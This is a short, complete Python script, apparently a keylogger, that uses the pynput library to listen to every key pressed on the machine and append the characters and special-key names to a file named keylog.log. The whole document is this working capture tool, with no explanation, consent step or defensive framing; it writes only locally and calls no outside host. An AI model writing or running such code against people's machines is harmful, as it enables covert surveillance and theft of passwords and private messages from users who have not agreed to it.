from pynput import keyboard

def on_press(key):
    with open('keylog.log', 'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
            special = keyboard.Key
            match key:
                case special.space:
                    f.write(' ')
                case special.enter:
                    f.write('\n')
                case _:
                    f.write(' [' + str(key).split('.')[1] + '] ')

with keyboard.Listener(
        on_press=on_press,
        ) as listener:
    listener.join()
